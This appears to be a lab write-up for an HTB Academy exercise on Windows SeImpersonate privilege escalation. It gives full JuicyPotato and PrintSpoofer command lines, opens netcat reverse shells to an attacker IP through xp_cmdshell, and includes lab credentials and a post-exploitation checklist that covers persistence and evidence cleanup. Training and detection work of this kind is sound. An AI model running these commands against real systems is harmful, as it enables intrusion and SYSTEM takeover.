# SeImpersonate & SeAssignPrimaryToken Privilege Escalation

## 🎯 Overview

**SeImpersonate and SeAssignPrimaryToken** are powerful privileges that allow escalation from service accounts to SYSTEM level access. These privileges enable processes to impersonate other users' security tokens, commonly exploited through "Potato-style" attacks.

## 🔑 Token Impersonation Fundamentals

### Access Token Concepts
- **Process tokens** contain security context information
- **Token impersonation** allows assuming another user's identity
- **SeImpersonatePrivilege** required to utilize stolen tokens
- **Memory-based attacks** target token locations in process memory

### Key Privileges
```cmd
SeImpersonatePrivilege        # Impersonate client after authentication
SeAssignPrimaryTokenPrivilege # Replace process level token
```

**Common Service Account Context:**
- IIS application pools
- SQL Server service accounts  
- Jenkins execution contexts
- MSSQL xp_cmdshell execution

## 🥔 Potato Attack Family

### Attack Mechanism
1. **Service account** has SeImpersonatePrivilege but limited SYSTEM access
2. **Potato attack** tricks SYSTEM process to connect to attacker-controlled process
3. **Token handover** occurs during connection authentication
4. **Token abuse** elevates privileges to NT AUTHORITY\SYSTEM

### JuicyPotato - Legacy Systems

#### Prerequisites
- **SeImpersonate** OR **SeAssignPrimaryToken** privilege
- **Windows Server 2016** and earlier (before build 1809)
- **DCOM/NTLM reflection** capabilities

#### Basic Usage
```cmd
# Basic privilege escalation
JuicyPotato.exe -l [listening_port] -p c:\windows\system32\cmd.exe -a "/c [command]" -t *

# Reverse shell example
JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```

**Parameters:**
- `-l` - COM server listening port
- `-p` - Program to launch  
- `-a` - Arguments passed to program
- `-t` - CreateProcess call type (* = try both)

### PrintSpoofer - Modern Systems

#### Advantages
- **Windows Server 2019** and **Windows 10 build 1809+** compatible
- **Print Spooler service** abuse mechanism
- **Multiple execution modes** available

#### Usage Examples
```cmd
# Interactive SYSTEM shell in current console
PrintSpoofer.exe -i -c cmd

# Desktop SYSTEM process (RDP sessions)
PrintSpoofer.exe -d -c cmd

# Reverse shell execution
PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

### RoguePotato - Alternative Approach
- **OXID resolver** abuse technique
- **Named pipe** impersonation method
- **Server 2019** and **Windows 10** compatible

## 💻 Practical Exploitation Scenario

### SQL Server Service Account Compromise

#### Initial Access via MSSQL
```bash
# Connect with mssqlclient.py
mssqlclient.py sql_dev@10.129.43.30 -windows-auth

# Enable xp_cmdshell
SQL> enable_xp_cmdshell

# Verify service account context
SQL> xp_cmdshell whoami
# Output: nt service\mssql$sqlexpress01
```

#### Privilege Assessment
```cmd
SQL> xp_cmdshell whoami /priv

# Key privileges to identify:
SeAssignPrimaryTokenPrivilege # Replace process level token - Disabled
SeImpersonatePrivilege        # Impersonate client after authentication - Enabled
SeManageVolumePrivilege       # Perform volume maintenance tasks - Enabled
```

#### JuicyPotato Exploitation
```cmd
# Upload JuicyPotato.exe and nc.exe to target
# Set up listener: nc -lnvp 8443

# Execute privilege escalation
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *

# Expected output:
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK
```

#### PrintSpoofer Alternative
```cmd
# Modern Windows systems
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

# Expected output:
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

### Verification
```cmd
# Confirm SYSTEM access
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>hostname  
WINLPE-SRV01
```

## 🛠️ Tool Comparison

| Tool | OS Support | Method | Reliability |
|------|------------|--------|-------------|
| **JuicyPotato** | ≤ Server 2016 | DCOM/NTLM Reflection | High |
| **PrintSpoofer** | Server 2019+ Win10 1809+ | Print Spooler Service | High |
| **RoguePotato** | Server 2019+ Win10+ | OXID Resolver | Medium |
| **SweetPotato** | Universal | Multiple methods | High |

## 🎯 HTB Academy Lab Solution

### Lab Environment
- **Target**: `10.129.43.43` (ACADEMY-WINLPE-SRV01)
- **Credentials**: `sql_dev:Str0ng_P@ssw0rd!`
- **Objective**: Escalate privileges and retrieve flag

### Detailed Step-by-Step Solution

#### 1. Initial Connection with MSSQL
```bash
┌─[us-academy-1]─[10.10.14.143]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ mssqlclient.py sql_dev@10.129.43.43 -windows-auth
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password: Str0ng_P@ssw0rd!
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed database context to 'master'.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (130 19162) 
[!] Press help for extra shell commands
SQL> 
```

#### 2. Enable xp_cmdshell for Command Execution
```cmd
SQL> enable_xp_cmdshell

[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
```

#### 3. Enumerate Privileges - Key Step!
```cmd
SQL> xp_cmdshell whoami /priv

output                                                                             
--------------------------------------------------------------------------------   
NULL                                                                               

PRIVILEGES INFORMATION                                                             
----------------------                                                             
NULL                                                                               

Privilege Name                Description                               State      
============================= ========================================= ========   
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   

NULL   
```

**✅ Critical Finding**: `SeImpersonatePrivilege` is **Enabled** - this allows privilege escalation!

#### 4. Set Up Reverse Shell Listener (New Terminal)
```bash
┌─[us-academy-1]─[10.10.14.143]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ nc -lvnp 8443

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::8443
Ncat: Listening on 0.0.0.0:8443
```

#### 5. Execute PrintSpoofer Privilege Escalation
```cmd
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "C:\tools\nc.exe 10.10.14.143 8443 -e cmd.exe"

output                                                                             
--------------------------------------------------------------------------------   
[+] Found privilege: SeImpersonatePrivilege                                        
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

#### 6. Receive SYSTEM Shell
```bash
┌─[us-academy-1]─[10.10.14.143]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ nc -lvnp 8443

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::8443
Ncat: Listening on 0.0.0.0:8443
Ncat: Connection from 10.129.43.43.
Ncat: Connection from 10.129.43.43:49699.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

#### 7. Verify SYSTEM Access & Retrieve Flag
```cmd
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>hostname
WINLPE-SRV01

# Retrieve the flag
C:\Windows\system32>type C:\Users\Administrator\Desktop\SeImpersonate\flag.txt
[FLAG_CONTENT_HERE]
```

### Alternative Methods

#### Using JuicyPotato (for older systems)
```cmd
# If PrintSpoofer fails, try JuicyPotato
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.143 8443 -e cmd.exe" -t *
```

### Key Success Indicators

1. **✅ SeImpersonatePrivilege Enabled** - Confirmed in step 3
2. **✅ PrintSpoofer Success Message** - `[+] Found privilege: SeImpersonatePrivilege`
3. **✅ SYSTEM Shell Received** - `whoami` returns `nt authority\system`
4. **✅ Flag Retrieved** - Successfully read from Administrator desktop

### Troubleshooting Common Issues

#### If PrintSpoofer Fails:
```cmd
# Try alternative tools based on OS version:
# Windows Server 2016 and below: JuicyPotato
# Windows 10/Server 2019+: PrintSpoofer, RoguePotato
```

#### If Connection Issues:
```cmd
# Verify firewall rules and network connectivity
# Try different ports: 443, 80, 8080, 9001
```

#### If Tools Not Present:
```cmd
# Upload tools first (may require web shell or other upload method)
# Or use PowerShell-based alternatives
```

## 🔍 Detection Indicators

### Process Behavior
```cmd
# Unusual SYSTEM processes spawned from service accounts
# COM server listening on high ports
# Named pipe creation by non-privileged accounts
# Print Spooler service interactions
```

### Event Logs
- **Event ID 4648** - Explicit credential logon (token impersonation)
- **Event ID 4672** - Special privileges assigned to logon
- **Event ID 4624** - Account logon events

## 🛡️ Defense Strategies

### Privilege Hardening
```cmd
# Remove SeImpersonate from service accounts
# Implement least-privilege principles
# Regular privilege audits
```

### Detection Rules
```cmd
# Monitor for:
- JuicyPotato.exe execution
- PrintSpoofer.exe execution  
- Unusual token impersonation events
- SYSTEM processes spawned by service accounts
```

## 📋 SeImpersonate Exploitation Checklist

### Prerequisites
- [ ] **Service account access** (web shell, SQL, Jenkins)
- [ ] **SeImpersonatePrivilege** OR **SeAssignPrimaryTokenPrivilege** 
- [ ] **Tool upload capability** (JuicyPotato/PrintSpoofer)
- [ ] **Network connectivity** for reverse shells

### Execution Steps  
- [ ] **Verify privileges** (`whoami /priv`)
- [ ] **Select appropriate tool** based on OS version
- [ ] **Upload exploitation binary** to target system
- [ ] **Set up reverse shell listener** on attack machine
- [ ] **Execute privilege escalation** command
- [ ] **Confirm SYSTEM access** (`whoami`)

### Post-Exploitation
- [ ] **Retrieve sensitive data** (flags, credentials)
- [ ] **Establish persistence** (user creation, services)
- [ ] **Lateral movement** preparation
- [ ] **Evidence cleanup** (optional)

## 💡 Key Takeaways

1. **SeImpersonate privilege** is extremely powerful for privilege escalation
2. **Service accounts** commonly have this privilege enabled
3. **Tool selection** depends on target OS version and build
4. **Multiple techniques** available - always have backups ready
5. **Common attack vector** - expect this in most web applications
6. **High success rate** when prerequisites are met

---

*SeImpersonate privilege escalation remains one of the most reliable Windows privilege escalation techniques, particularly in service account compromise scenarios.* 